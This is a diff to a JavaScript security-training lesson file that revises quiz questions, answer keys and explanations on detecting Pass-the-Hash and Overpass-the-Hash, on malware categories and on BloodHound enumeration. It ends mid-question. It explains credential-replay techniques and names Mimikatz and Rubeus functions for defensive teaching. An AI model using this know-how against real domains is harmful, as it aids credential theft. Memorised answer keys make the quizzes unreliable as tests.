@@ -256,142 +256,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "An organisation enforces very strong, uncrackable passwords, yet an attacker who compromised one workstation is authenticating to other machines as a domain administrator without ever knowing or cracking that admin's password. How is this possible, and what technique is in use?",
+        "question": "An organisation enforces long, effectively uncrackable passwords. After compromising one workstation, an attacker authenticates to several servers as a domain admin. There are no failed logons anywhere, and the attacker never learned the admin's plaintext password. Which technique fits this evidence?",
         "options": [
           {
-            "label": "It is impossible, because strong uncrackable passwords make it fundamentally impossible for an attacker to authenticate as another user under any circumstances, so the scenario cannot really be happening",
+            "label": "Kerberoasting: request a service ticket for the admin account and recover its password from the ticket offline",
             "value": "a"
           },
           {
-            "label": "Pass-the-Hash / Pass-the-Ticket (T1550): the attacker dumped the admin's NTLM hash or Kerberos ticket from LSASS on the compromised host and replays it directly — Windows accepts the hash/ticket as proof, so password strength is irrelevant once the secret is stolen",
+            "label": "Pass-the-Hash or Pass-the-Ticket: reuse the admin's NT hash or Kerberos ticket taken from LSASS memory",
             "value": "b"
           },
           {
-            "label": "A dictionary attack that succeeded because the admin's password, despite policy, was actually the word 'password', which is the only way to authenticate as another user without their real credentials",
+            "label": "Credential stuffing: replay the admin's password as it leaked in an unrelated third-party breach",
             "value": "c"
           },
           {
-            "label": "The attacker guessed the password through the domain controller's login prompt, which is why account-lockout policy is the single control that would have completely prevented this activity",
+            "label": "Password spraying: try one common password across many accounts until the admin's account matches",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Windows accepts the NTLM hash and the Kerberos ticket as direct proof of identity, so an attacker who dumped the admin's hash or ticket from LSASS on the compromised host can replay it (Pass-the-Hash / Pass-the-Ticket, T1550) and authenticate as the admin — no cracking involved, which is why even an uncrackable password does not help. The 'it is impossible' option misunderstands that the attack bypasses the password entirely. The dictionary-attack option invents a weak password contradicting the premise. The login-prompt guessing option describes online guessing, which is not what is happening — there are no password attempts, just replayed secrets."
+        "explanation": "Windows accepts the NT hash (NTLM) and a valid Kerberos ticket as direct proof of identity, so an attacker who read them from LSASS on the compromised host can replay them as the admin. Nothing is guessed or cracked, which is why password strength does not help and no failed logons appear. Kerberoasting ends in offline cracking that recovers a password, which an uncrackable password defeats and which contradicts “never learned the plaintext”. Credential stuffing replays a known plaintext password, which the attacker does not have. Password spraying is online guessing that leaves failed logons and cannot succeed against an uncrackable password."
       },
       {
-        "question": "In a Kerberos-first Windows domain, you observe a spike of NTLM authentications (Event 4776) between workstations using a privileged account, shortly after a process was seen opening lsass.exe on one of those hosts. What does this sequence most likely indicate?",
+        "question": "In a Kerberos-first domain, Sysmon shows an unusual process opening lsass.exe on workstation WS-17. Minutes later the domain controller records a burst of Event 4776 (NTLM credential validation) for a privileged account, with WS-17 and two other workstations as the source workstations. What does this sequence most likely show?",
         "options": [
           {
-            "label": "Routine Kerberos operation, because NTLM and Kerberos are the same protocol and a spike in one is simply normal domain authentication that never warrants any investigation at all",
+            "label": "NTLM relay: the admin's live NTLMv2 authentication is being forwarded to other servers as it happens",
             "value": "a"
           },
           {
-            "label": "Credential theft then Pass-the-Hash: LSASS access dumped a hash, and the NTLM-where-Kerberos-is-expected logons by a privileged account are the replay driving lateral movement — LSASS access is the earliest warning",
+            "label": "Credential dumping, then Pass-the-Hash: the LSASS read yielded an NT hash that is now replayed over NTLM",
             "value": "b"
           },
           {
-            "label": "A failed backup job, since LSASS access and NTLM authentication together are the normal signature of backup software and carry no security meaning whatsoever for an analyst",
+            "label": "Kerberoasting: service tickets were taken from LSASS, and the 4776 events are the cracking attempts",
             "value": "c"
           },
           {
-            "label": "Proof that the domain has switched to NTLM permanently, which is a beneficial security upgrade and explains the spike as an intended and desirable configuration change",
+            "label": "Overpass-the-Hash: the dumped hash is exchanged for TGTs, which the DC records as NTLM validation",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The sequence is textbook: a process opening lsass.exe indicates credential dumping, and the following NTLM authentications (4776) in a Kerberos-first domain — privileged account, workstation-to-workstation — are the Pass-the-Hash replay driving lateral movement. The LSASS access is the earliest and clearest warning, before the replay. The 'routine Kerberos operation' option falsely equates NTLM and Kerberos and dismisses a real signal. The 'failed backup job' option invents a benign backup explanation the pattern does not fit. The 'switched to NTLM permanently' option misframes a Pass-the-Hash indicator as a beneficial upgrade; NTLM is the weaker, older protocol."
+        "explanation": "The LSASS access is the credential-dumping precursor, and NTLM validations (4776) for a privileged account between workstations in a Kerberos-first domain are what a replayed NT hash looks like: dump, then Pass-the-Hash. NTLM relay forwards someone’s live network authentication and needs no LSASS read, so it does not explain the precursor. Kerberoasting cracks tickets offline, and offline cracking writes nothing to the DC log. Overpass-the-Hash turns the hash into a Kerberos TGT request (Event 4768), so its hops look like Kerberos and do not produce 4776."
       },
       {
-        "question": "You see Event ID 4624 with Logon Type 3 and Authentication Package NTLM for a privileged service account that almost always authenticates via Kerberos, and a process opened lsass.exe on the source host minutes earlier. What should this sequence make you suspect first?",
+        "question": "An attacker captured NTLMv2 challenge-responses for a privileged account off the network with a Responder-style capture, but never accessed LSASS on any host. A colleague says the account is now exposed to Pass-the-Hash. Which assessment is correct?",
         "options": [
           {
-            "label": "A benign software update, because Logon Type 3 combined with NTLM is the routine signature of Windows Update checking for patches and needs no further investigation",
+            "label": "Correct: an NTLMv2 response is the account’s NT hash in another encoding, so it can be replayed as-is",
             "value": "a"
           },
           {
-            "label": "Pass-the-Hash: the LSASS access likely dumped the account's NTLM hash on the source host, and the NTLM network logon by a normally-Kerberos account is consistent with that hash being replayed elsewhere",
+            "label": "Not directly: the response is mixed with a per-session challenge, so it enables cracking or relay, not passing",
             "value": "b"
           },
           {
-            "label": "A misconfigured DNS server, since NTLM authentication only occurs when Kerberos cannot resolve the target hostname and has nothing to do with credential theft",
+            "label": "Correct, for about ten hours: a captured response can be replayed until the account’s TGT expires",
             "value": "c"
           },
           {
-            "label": "The account's password expired, because Windows automatically falls back from Kerberos to NTLM whenever a password is more than ninety days old",
+            "label": "Low risk: an NTLMv2 response holds no password-derived material, so a capture cannot be cracked or reused",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The LSASS access is the classic credential-dumping precursor, and the following NTLM network logon (Type 3) by an account that normally uses Kerberos is exactly what a replayed NTLM hash looks like — Pass-the-Hash. The benign software update option invents a Windows Update explanation that doesn't fit a privileged service account authenticating from an unusual source. The misconfigured DNS server option misunderstands Kerberos/NTLM negotiation, which depends on protocol support and configuration, not DNS failures, and ignores the LSASS access entirely. The expired-password option invents an automatic fallback behaviour Windows does not have; password age does not force NTLM."
+        "explanation": "Only the stored NT hash is passable. An NTLMv2 response is an HMAC over the server and client challenges keyed by the NT hash, so it is tied to one session: it is useful for offline cracking or for NTLM relay, not for Pass-the-Hash. Treating it as “the NT hash in another encoding” is the exact confusion the lesson warns about. The ten-hour window mixes up Kerberos TGT lifetime with NTLM, which issues no tickets. Saying it holds no password-derived material is wrong: it is keyed by the NT hash, which is why a weak password can be cracked from it."
       },
       {
         "question": "You add all Tier 0 domain administrators to the built-in Protected Users group. Which effect most directly reduces Pass-the-Hash risk for those accounts, and what new signal does it hand the SOC?",
         "options": [
           {
-            "label": "It encrypts each account's NTLM hash in LSASS with the krbtgt key, making the hash mathematically impossible to dump and therefore removing any need to monitor those accounts at all going forward.",
+            "label": "Their TGTs are capped at four hours, so a dumped NT hash stops working within four hours; reuse after that is the signal",
             "value": "a"
           },
           {
-            "label": "Members cannot authenticate with NTLM at all, which blocks Pass-the-Hash for them by design, so any Event 4776 (NTLM validation) naming a Protected Users member becomes an immediate anomaly to investigate.",
+            "label": "They cannot authenticate with NTLM, which blocks Pass-the-Hash for them; any Event 4776 naming a member is an anomaly",
             "value": "b"
           },
           {
-            "label": "It forces those accounts to use only NTLM instead of Kerberos, which is simpler to monitor, so a steady spike of Event 4776 for them becomes the expected and healthy baseline rather than a concern.",
+            "label": "Their secrets are isolated by Credential Guard so LSASS cannot be dumped; a Sysmon 10 event on lsass.exe becomes the signal",
             "value": "c"
           },
           {
-            "label": "It automatically resets each account's password every four hours, meaning any stolen hash silently expires before it can be replayed against any other host anywhere in the domain.",
+            "label": "They cannot use RC4 in Kerberos pre-authentication, which blocks Pass-the-Hash; any Event 4768 for a member is an anomaly",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Protected Users members cannot use NTLM (or Digest/CredSSP), so Pass-the-Hash against them is blocked at the protocol level, and any NTLM validation (Event 4776) for such a member is by definition anomalous. The 'encrypts the NTLM hash with the krbtgt key' option invents krbtgt hash encryption that does not exist. The 'forces NTLM instead of Kerberos' option reverses reality — the group blocks NTLM, it does not force it. The 'resets passwords every four hours' option confuses the group's 4-hour TGT lifetime cap with a password reset; passwords are not rotated by membership."
+        "explanation": "Protected Users members cannot use NTLM (or Digest/CredSSP), so Pass-the-Hash, which is NTLM replay, is blocked for them, and any NTLM validation (4776) naming a member is anomalous by definition. The four-hour cap applies to TGTs and shrinks the Pass-the-Ticket window; an NT hash does not expire until the password changes. Credential Guard is a separate host control, not a side effect of group membership. The RC4 restriction is real, but it hardens Kerberos rather than NTLM, and a 4768 for a member is normal: every Kerberos sign-in produces one."
       },
       {
-        "question": "A domain has aggressively disabled NTLM and the SOC hunts hard for Event 4776. An attacker who dumped a service account's NT hash still moves laterally, and every hop appears in the logs as normal Kerberos activity. Which technique explains this, and why does the NTLM-focused detection miss it?",
+        "question": "A domain has disabled NTLM and the SOC hunts hard for Event 4776. An attacker who dumped a service account’s NT hash still moves laterally, and every hop is Kerberos. The DC shows Event 4768 (TGT request) for that account from the compromised workstation, with ticket encryption type 0x17 (RC4). Which technique explains this?",
         "options": [
           {
-            "label": "Overpass-the-Hash (Pass-the-Key): the NT hash IS the RC4 Kerberos key, so the attacker uses it to request a real TGT from the KDC and then authenticates over Kerberos, which never triggers NTLM validation (4776) detections",
+            "label": "Overpass-the-Hash: the NT hash is the RC4 Kerberos key, so it is traded for a genuine TGT and no 4776 is written",
             "value": "a"
           },
           {
-            "label": "It is a plain Pass-the-Hash and the logs are simply wrong, because disabling NTLM makes every credential-replay technique in Active Directory completely impossible from that point onward",
+            "label": "Pass-the-Ticket: a TGT copied from LSASS memory is injected and reused, so no NTLM validation takes place",
             "value": "b"
           },
           {
-            "label": "The attacker must have cracked the service account password offline first, since there is no way any stolen hash can ever be converted into a usable Kerberos ticket without the plaintext",
+            "label": "Kerberoasting: RC4 service tickets were cracked offline, and the recovered password is now used to log on",
             "value": "c"
           },
           {
-            "label": "Kerberos cannot be abused with a stolen hash at all, so the only remaining explanation is that the service account had no password configured on it",
+            "label": "Classic Pass-the-Hash over NTLM, with the 4776 events written on a different DC from the one searched",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "For the RC4 encryption type the Kerberos key derived from the password is literally the NT (NTLM) hash, so an attacker holding the hash can send an AS-REQ and receive a genuine TGT (Overpass-the-Hash / Pass-the-Key). Every subsequent hop is real Kerberos, so detections that only look at NTLM validation (Event 4776) see nothing — you must pivot to Kerberos telemetry such as 4768 TGT requests from anomalous hosts and RC4 enc-type usage. The 'plain Pass-the-Hash, logs are wrong' option wrongly claims disabling NTLM ends all replay. The claim that the password must have been cracked first is false — no cracking is needed. The idea that the account had no password is nonsense."
+        "explanation": "For RC4 the Kerberos key is literally the NT hash, so the attacker sends an AS-REQ with it and receives a real TGT (Overpass-the-Hash). That is why the DC logs a 4768 from an unusual host with encryption type 0x17, and why NTLM-only hunting sees nothing. Pass-the-Ticket reuses a ticket that already exists, so it would not create fresh TGT requests from the workstation. Kerberoasting shows up as 4769 service-ticket requests and needs cracking, while this attacker already holds the hash. A missed DC cannot explain hops that are all Kerberos and the 4768 events themselves."
       },
       {
-        "question": "On a Kerberos-first network, an ordinary user workstation that has never run administrative tooling logs Event 4624 with Logon Type 9 (NewCredentials) and Logon Process seclogo: Account Name is the logged-on user, while Network Account Name is a privileged service account. Why is this specific logon type a strong credential-replay signal on this source host?",
+        "question": "On a Kerberos-first network, an ordinary user workstation that never runs administrative tooling logs Event 4624 with Logon Type 9 (NewCredentials) and Logon Process seclogo. Account Name is the logged-on user; Network Account Name is a privileged service account. Why is this a strong credential-replay signal on this host?",
         "options": [
           {
-            "label": "Logon Type 9 (NewCredentials) is produced when a process is started with alternate credentials used only for outbound connections (the runas /netonly path that Mimikatz sekurlsa::pth and Rubeus createnetonly use), so a privileged account appearing as the network identity on a user desktop is abnormal",
+            "label": "Type 9 marks a process run with alternate credentials for outbound use, as hash-replay tools do; a privileged identity there is abnormal",
             "value": "a"
           },
           {
-            "label": "Logon Type 9 always means a physical console interactive sign-in, which service accounts are technically forbidden from ever performing under any circumstance in Active Directory",
+            "label": "Type 9 is a network logon arriving from another machine, so the privileged service account has just signed in to this desktop remotely",
             "value": "b"
           },
           {
-            "label": "Logon Type 9 is the code for a Kerberos ticket expiring, so seeing it simply proves the account's TGT reached the end of its normal ten-hour lifetime and nothing more",
+            "label": "Type 9 is an interactive logon checked against cached credentials, so the service account signed in while no DC was reachable",
             "value": "c"
           },
           {
-            "label": "Logon Type 9 indicates a cached credential logon used only when no domain controller is reachable, so it just means the workstation was temporarily offline at the time",
+            "label": "Type 9 is written when a stolen Kerberos ticket is injected into a session, which is how Pass-the-Ticket appears on the target",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Logon Type 9 (NewCredentials) is generated on the host where a process is started with alternate credentials for outbound connections only — the runas /netonly mechanism that Mimikatz sekurlsa::pth (Pass-the-Hash / Overpass-the-Hash) and Rubeus createnetonly use. The event keeps the original caller as Account Name and records the alternate identity under Network Account Name, with Logon Process seclogo. A privileged service account appearing there, on a desktop that never legitimately does this, is a strong sign that its stolen hash or key is being used from this machine. (Rubeus ptt, by contrast, injects a ticket into the existing session and creates no new Type 9 logon.) The 'physical console sign-in' option describes Type 2 (Interactive). The 'ticket expiring' option invents a meaning. The 'cached credential logon' option describes Type 11 (CachedInteractive)."
+        "explanation": "Logon Type 9 (NewCredentials) is written on the host where a process is launched with alternate credentials for outbound connections only, the runas /netonly mechanism that Pass-the-Hash and Overpass-the-Hash tooling uses. The original caller stays in Account Name and the borrowed identity appears under Network Account Name, so a privileged service account there, on a desktop that never does this, points to its stolen secret being used from this machine. A network logon from another machine is Type 3, not 9. A cached-credential interactive logon is Type 11. Injecting a ticket into an existing session creates no new logon, so Pass-the-Ticket does not produce Type 9."
       }
     ],
     "references": [
@@ -464,96 +464,96 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "During triage you determine a sample was disguised as a software update the user ran (no self-spreading), which then wrote a second program to disk and executed it; that second program harvested saved browser passwords and cookies and sent them out. Using the purpose-based categories, how would you describe this sample, and why does the description matter more than a single label?",
+        "question": "During triage you find a sample was disguised as a software update that the user ran; it did not spread to other hosts. It then wrote a second program, carried inside its own file, to disk and ran it (nothing was downloaded). That second program harvested saved browser passwords and cookies and sent them out. Using the purpose-based categories, which description fits, and what does it tell you to do next?",
         "options": [
           {
-            "label": "It is simply 'a virus', because all malware is a virus, and forcing every sample into that one category is the standard and correct way analysts classify malicious software",
+            "label": "A virus (it infected the update file the user ran) acting as a loader, delivering spyware — find every other copy of the infected update file",
             "value": "a"
           },
           {
-            "label": "A trojan (disguise, no self-spread) acting as a dropper (writes + runs a second stage) delivering an infostealer (harvests creds/cookies) — naming what it DOES tells you what data left and which accounts are exposed",
+            "label": "A trojan (user-run disguise) acting as a dropper (writes its embedded second stage), delivering an infostealer — scope which credentials left",
             "value": "b"
           },
           {
-            "label": "It must be a worm, because any malware that writes a file to disk is by definition self-propagating across the network, which is the single defining property of every type of malware",
+            "label": "A trojan (user-run disguise) acting as a loader (fetches the next stage), delivering a RAT — hunt the command-and-control channel first",
             "value": "c"
           },
           {
-            "label": "The categories are irrelevant labels, so the only correct action is to record the file hash and close the case, since what a sample actually does has no bearing on the investigation",
+            "label": "A worm (it reached the host by itself) acting as a dropper, delivering a keylogger — check which other hosts received the same update",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The sample combines categories by purpose: a trojan (disguised as an update, relying on the user, not self-spreading), acting as a dropper (writing and running a second stage), which is an infostealer (harvesting saved passwords and cookies and exfiltrating them). Describing what it does across categories is what drives the investigation — an infostealer means you must determine what credentials and data left and which accounts are now exposed. The 'simply a virus' option wrongly collapses everything to 'virus.' The 'must be a worm' option misdefines a worm (writing a file is not self-propagation). The 'record the hash and close' option dismisses the categories that actually direct the response."
+        "explanation": "Describe the sample by what each stage does. It relied on the user running a disguised update and did not self-spread, so it is a trojan. It wrote a second stage it carried inside itself, so it acted as a dropper (a loader fetches the next stage from the internet, and nothing was downloaded here). The second stage harvested saved passwords and cookies and sent them out, which is an infostealer, so the next question is which accounts and sessions are now exposed. The 'virus … loader … spyware' option is wrong on all three: nothing shows a host file being infected, nothing was fetched, and harvesting credential stores is the infostealer's job. The 'trojan … loader … RAT' option gets the disguise right but misreads the delivery (no download) and the payload (no remote control was seen). The 'worm … dropper … keylogger' option ignores that the user ran it and that it did not spread, and a keylogger records typing rather than copying saved password stores."
       },
       {
-        "question": "An analyst confirms a host is infected with a worm. Beyond cleaning the infected host, what is the single most urgent question the 'worm' category should immediately prompt, and why?",
+        "question": "An analyst confirms a host is infected with a worm. Beyond cleaning that host, which question should the 'worm' category prompt first, and why?",
         "options": [
           {
-            "label": "What ransom amount is being demanded, because every worm's defining purpose is to encrypt files and extort payment, so the ransom note is always the first thing to locate and analyse",
+            "label": "Which user opened the file that started it, because finding patient zero explains how the worm reached every other host",
             "value": "a"
           },
           {
-            "label": "Which other hosts has it already spread to — because a worm self-propagates across the network on its own, so by the time one host is found the infection has very likely reached others that must be found and contained",
+            "label": "Which other hosts it has already reached, because a worm spreads by itself and has likely moved past this one host",
             "value": "b"
           },
           {
-            "label": "Nothing further is needed, because a worm cannot spread beyond the single machine it first infects, so cleaning that one host fully resolves the entire incident with no wider scope",
+            "label": "Whether the backups are intact and offline, because the first move for a worm is the same as for a ransomware alert",
             "value": "c"
           },
           {
-            "label": "What the user clicked to run it, because a worm requires a user to open a host file to propagate, making the user's action the only relevant factor in a worm investigation",
+            "label": "Which command-and-control server it beacons to, because hunting the C2 channel is the first move for this infection",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A worm's defining property is that it self-propagates across the network with no host file and no user action, so identifying a worm should immediately raise the scope question: which other hosts has it already reached? By the time you find one infected machine, a worm has likely spread further, and containment depends on finding and isolating the rest. The ransom-amount option confuses worms with ransomware. The claim that a worm cannot spread beyond one machine is exactly wrong — self-spreading is the whole danger. The 'what the user clicked' option describes a virus (needs a host file and user), not a worm, which needs neither."
+        "explanation": "A worm's defining property is that it self-propagates across the network with no host file and no user action, so the category's first question is scope: which other hosts has it already reached? The 'patient zero' option is a virus/trojan mindset: a worm's spread to further hosts does not depend on any user opening anything, so the first user's action does not explain or contain the spread. The 'check backups' option applies the ransomware/wiper first move to a different category; a worm may carry ransomware, but the worm label itself points to spread. The 'hunt the C2 channel' option is the first move for a RAT or backdoor, not the question the worm category raises."
       },
       {
         "question": "An EDR alert shows a process copying files named after the browser's saved-password and cookie stores into a temp folder, then sending several hundred kilobytes to an external IP seconds later. No files are encrypted and no ransom note appears. Which category best fits this footprint, and what should you check next?",
         "options": [
           {
-            "label": "Ransomware — any process that reads files and then sends data out is by definition encrypting them for extortion, so the priority is locating the ransom note and the encryption key",
+            "label": "Keylogger — it captured the user's passwords, so review which keystrokes were recorded during the session",
             "value": "a"
           },
           {
-            "label": "Infostealer — this is the footprint of harvesting saved credentials and exfiltrating them, so the priority is determining which accounts and sessions on this host are now exposed and need resetting",
+            "label": "Infostealer — it harvested saved credentials and sent them out, so scope which accounts and sessions are exposed",
             "value": "b"
           },
           {
-            "label": "Worm — writing new files into a temp folder is the defining trait of self-propagation, so the priority is scanning the entire network for identical files",
+            "label": "RAT — the outbound connection is a check-in to its controller, so hunt the command-and-control channel first",
             "value": "c"
           },
           {
-            "label": "Cryptominer — any process running silently in the background is mining cryptocurrency, so the priority is checking CPU utilisation graphs for the host",
+            "label": "Worm — copying files and then connecting out is how it moves on, so check other hosts for the same files",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Copying files named after the browser's login/cookie stores and then egressing a similar-sized payload seconds later is the infostealer shape: harvest saved credentials, send them out. The priority is scoping which accounts and sessions are exposed and resetting them. The ransomware option is wrong — no encryption or ransom note is present. The worm option misreads writing a local temp file as network self-propagation, which it is not. The cryptominer option is wrong because nothing here shows sustained CPU load or a mining-pool connection, the actual cryptominer tell."
+        "explanation": "Copying the browser's login and cookie stores and then sending a few hundred kilobytes out seconds later is the infostealer shape: harvest saved credentials, exfiltrate them. The next step is scoping which accounts and sessions are exposed and resetting them. The keylogger option confuses two credential thieves: a keylogger records what the user types, while this process copied stored password and cookie files. The RAT option misreads one bulk upload as a beacon; a RAT beacon is small, repeated check-ins on a fixed interval, which this footprint does not show. The worm option misreads a local temp-folder copy plus one outbound upload as network self-propagation; nothing shows the sample reaching another host."
       },
       {
-        "question": "An organization discovers a machine is still compromised immediately after the operating system was reinstalled over the existing Windows partition. Investigation finds the infection modifies the Master Boot Record before Windows even loads. Which malware category best explains why reinstalling the OS did not fix this, and why?",
+        "question": "A machine is still compromised immediately after the operating system was reinstalled over the existing Windows partition. Investigation finds the infection modifies the Master Boot Record before Windows even loads. Which category best explains why the reinstall did not fix it?",
         "options": [
           {
-            "label": "A worm, because worms always reinfect a machine automatically the moment it reconnects to the same network",
+            "label": "A rootkit, because it hides inside the running kernel, which a reinstall over the old partition leaves untouched",
             "value": "a"
           },
           {
-            "label": "A bootkit, because it infects the boot sector or firmware below the OS, so a reinstall that does not rewrite the boot code leaves it in place",
+            "label": "A bootkit, because it lives in the boot code below the OS, which a reinstall that keeps the boot sector leaves in place",
             "value": "b"
           },
           {
-            "label": "A keylogger, because keyloggers install themselves into the BIOS by default on every modern computer",
+            "label": "A backdoor set by a Registry Run key, because Run-key persistence carries over when Windows is reinstalled",
             "value": "c"
           },
           {
-            "label": "A cryptominer, because miners are the only malware type known to survive a full disk reformat and reinstall",
+            "label": "Fileless malware, because it lives in memory, and memory is not cleared when the operating system is reinstalled",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A bootkit (MITRE T1542.003) infects the Master Boot Record, Volume Boot Record, or UEFI firmware/ESP — a layer that executes before the operating system loads, so it lives outside the OS and survives a reinstall that does not rewrite the boot sector or ESP; a firmware (SPI-flash) implant survives even a full disk wipe. Remediation requires rewriting the boot sectors/ESP (for example a full wipe and clean install), or re-flashing the firmware for a firmware implant. The worm option wrongly attributes reinfection to worm self-spreading rather than boot-level persistence. The keylogger option fabricates a default BIOS-installation behavior for keyloggers. The cryptominer option is wrong because cryptominers have no special boot-level persistence property; a reformat removes an ordinary cryptominer."
+        "explanation": "A bootkit (MITRE T1542.003) infects the Master Boot Record, Volume Boot Record, or UEFI boot files in the EFI System Partition, code that runs before the operating system loads. It lives outside the Windows partition, so a reinstall that does not rewrite the boot sector or ESP leaves it in place; a firmware (SPI-flash) implant survives even a full disk wipe. Remediation means rewriting the boot sectors/ESP, or re-flashing firmware for a firmware implant. The rootkit option describes stealth inside a running OS, but the reinstall replaced that OS and its kernel, and the evidence points to the MBR. The Run-key option is wrong because Run keys live in the Windows Registry, which the reinstall replaced. The fileless option is wrong because memory-resident code does not survive the reboots a reinstall involves."
       }
     ],
     "references": [
@@ -1015,119 +1015,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A SOC notices one standard user account generating thousands of Event ID 4662 object-read operations across users, groups, and computer objects within a few minutes. What is the most likely explanation?",
+        "question": "A SOC notices one standard user account, logged on to an ordinary workstation, generating thousands of Event ID 4662 object-read operations across users, groups and computer objects within a few minutes. What is the most likely explanation?",
         "options": [
           {
-            "label": "A scheduled backup service reading its own configuration objects during a nightly maintenance job on the domain controller.",
+            "label": "A scheduled backup job reading directory objects during a nightly maintenance window on the domain controller.",
             "value": "a"
           },
           {
-            "label": "SharpHound performing bulk AD enumeration, collecting object ACLs and memberships to build a BloodHound attack-path graph.",
+            "label": "SharpHound-style collection reading object ACLs and memberships to build a BloodHound attack-path graph.",
             "value": "b"
           },
           {
-            "label": "A single interactive user logon that reads only that user's own group memberships as part of applying group policy.",
+            "label": "Kerberoasting in progress, since the account is requesting a service ticket for every object it reads.",
             "value": "c"
           },
           {
-            "label": "Normal replication between two domain controllers synchronizing directory changes across the site link on schedule.",
+            "label": "Normal replication between two domain controllers synchronizing directory changes on their schedule.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: a burst of thousands of 4662 reads spanning many object types and touching security descriptors is the hallmark of SharpHound ACL/membership collection for BloodHound. A backup service reads a narrow, predictable set of objects, not the whole directory. A normal logon reads only the user's own memberships, nowhere near thousands of objects. Replication is DC-to-DC and would not originate from a standard user account."
+        "explanation": "A burst of thousands of 4662 reads spanning many object types from one principal in minutes is the lesson’s signature of SharpHound ACL and membership collection. A backup job runs under a documented service identity on a fixed schedule and reads a predictable set of objects, not a standard user sweeping the directory from a workstation. The Kerberoasting option confuses two event types: service-ticket requests appear as 4769 on the DC, while 4662 records operations on directory objects. Replication is DC-to-DC traffic under DC machine accounts and would not originate from a standard user account."
       },
       {
         "question": "Why do defenders consider Active Directory ACLs, not just group memberships, a critical part of the BloodHound attack surface?",
         "options": [
           {
-            "label": "ACLs are encrypted with the krbtgt key, so reading them requires domain admin rights that most attackers cannot obtain.",
+            "label": "ACL rights become dangerous once the account holding them is also a member of a privileged group.",
             "value": "a"
           },
           {
-            "label": "ACLs can grant rights like GenericAll or ForceChangePassword that create non-obvious escalation edges chainable into a path.",
+            "label": "Rights such as GenericAll or ForceChangePassword create escalation edges that membership lists do not show.",
             "value": "b"
           },
           {
-            "label": "ACLs are stored only on domain controllers and never replicate, so they remain completely invisible to LDAP enumeration tools.",
+            "label": "Reading object ACLs needs Domain Admin rights, so attackers rarely see them before they control the domain.",
             "value": "c"
           },
           {
-            "label": "ACLs primarily control file share permissions and therefore have no bearing on Kerberos or directory privilege escalation.",
+            "label": "ACLs mainly govern file-share access, so they matter for data theft more than for directory escalation.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: delegated rights such as GenericAll, WriteDACL, and ForceChangePassword form graph edges that let an attacker escalate without any exploit, and BloodHound's transitive pathfinding chains them toward Domain Admins. ACLs are readable by any authenticated user and are not krbtgt-encrypted. Object security descriptors replicate and are readable over LDAP, which is how SharpHound collects them. These are directory-object ACLs governing AD rights, not merely file share permissions."
+        "explanation": "Delegated rights such as GenericAll, WriteDACL and ForceChangePassword are graph edges that let an account escalate without any exploit, and they are invisible if you only review group memberships; BloodHound chains them toward Domain Admins. The privileged-group option gets it backwards: the danger of an ACL edge is that it lets an unprivileged account reach privilege it does not hold. The Domain-Admin-to-read option is wrong because object security descriptors are readable over LDAP by ordinary authenticated users, which is how SharpHound collects them. The file-share option confuses directory-object ACLs, which govern rights over users, groups and computers in AD, with share permissions."
       },
       {
         "question": "Why does a defender running BloodHound against their own domain provide real security value, rather than just mapping what an attacker could already find?",
         "options": [
           {
-            "label": "Because BloodHound automatically deletes any dangerous ACL edge it discovers, remediating the domain without further administrator action.",
+            "label": "It shows the paths that attackers have already used, so the graph doubles as a record of past compromise.",
             "value": "a"
           },
           {
-            "label": "Because it surfaces the same chained ACL and membership paths an attacker would find, so defenders can remove them first.",
+            "label": "It finds the same chained ACL and membership paths an attacker would, so defenders can cut them first.",
             "value": "b"
           },
           {
-            "label": "Because BloodHound only works when run by a Domain Admin, so simply running it proves no lower-privileged account can reach Domain Admins.",
+            "label": "Defenders run it as Domain Admin, so their graph shows paths an ordinary attacker account could not see.",
             "value": "c"
           },
           {
-            "label": "Because SharpHound collection permanently disables LDAP querying for every other account in the domain once it completes.",
+            "label": "It replaces 4662 auditing, since the graph records each enumeration attempt made against the domain.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: BloodHound's value is surfacing the exact same non-obvious, chained escalation paths an attacker's graph would find, so defenders can remove the specific unnecessary edges before exploitation. Regarding automatic deletion of dangerous edges: BloodHound only visualises paths; it does not automatically remediate anything. Regarding the Domain-Admin-only claim: BloodHound can be run by any account with ordinary LDAP read access, which is the whole point of the exposure it reveals. Regarding SharpHound disabling LDAP: SharpHound collection does not disable LDAP for other accounts; it simply performs normal, permitted reads."
+        "explanation": "BloodHound’s defensive value is finding the same non-obvious chained paths an attacker’s graph would find, so defenders can remove the unnecessary edges before anyone uses them. The “already used” option confuses possible paths with exploitation history — the graph shows what rights exist, not what was abused. The Domain Admin option is wrong because the data BloodHound needs is readable by ordinary authenticated accounts; that is exactly why an attacker’s graph matches the defender’s. The 4662 option confuses an attack-path mapping tool with detection telemetry: BloodHound does not log anyone else’s enumeration."
       },
       {
-        "question": "Which Microsoft Defender for Identity reconnaissance alert most specifically corresponds to an attacker enumerating Service Principal Names and privileged principals over LDAP as the opening move of a Kerberoast?",
+        "question": "A workstation sends LDAP searches to a domain controller for every account that has a servicePrincipalName set and for the members of privileged groups, minutes before a burst of service-ticket requests from the same host. Which Defender for Identity reconnaissance alert matches this activity?",
         "options": [
           {
-            "label": "User and group membership reconnaissance (SAMR), because Service Principal Name enumeration is performed exclusively over the SAMR remote protocol and never appears in LDAP traffic at all.",
+            "label": "User and group membership reconnaissance (SAMR), which maps directory membership to find privileged accounts",
             "value": "a"
           },
           {
-            "label": "Security principal reconnaissance (LDAP), which flags targeted LDAP queries for SPNs and privileged principals and is commonly the first step of a Kerberoasting attack.",
+            "label": "Security principal reconnaissance (LDAP), raised for targeted LDAP lookups of high-value principals",
             "value": "b"
           },
           {
